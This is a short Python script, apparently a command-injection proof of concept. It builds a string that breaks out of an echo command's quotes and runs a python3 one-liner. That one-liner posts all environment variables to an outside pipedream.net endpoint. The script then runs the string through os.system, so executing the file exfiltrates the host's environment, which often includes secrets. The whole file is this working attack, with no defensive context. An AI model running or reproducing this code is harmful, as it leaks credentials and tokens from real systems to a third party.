import os

string = " \" && python3 -c \"import requests; message = {'message': str(os.environ)}; r = requests.post('https://e756afb172e9b06dad06e8cfeff52a32.m.pipedream.net',data = message);\" && echo \""

print(string)

print('echo "%s"' % (string))
os.system('echo "%s"' % (string))
